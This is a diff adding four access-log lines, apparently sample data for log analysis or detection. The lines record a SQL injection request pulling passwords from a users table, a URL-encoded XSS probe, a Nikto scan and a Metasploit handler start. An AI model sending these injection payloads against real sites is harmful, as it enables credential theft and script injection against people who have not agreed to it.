@@ -1,0 +1,4 @@
+[10/Jul/2026:12:00:00] "GET /index.php?id=1 UNION SELECT password FROM users-- HTTP/1.1" 200 452
+[10/Jul/2026:12:00:03] "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 215
+[10/Jul/2026:12:05:00] "Nikto v2.1.6 scan started against /var/www/html"
+[10/Jul/2026:12:06:00] "Metasploit handler started for exploit/multi/handler"
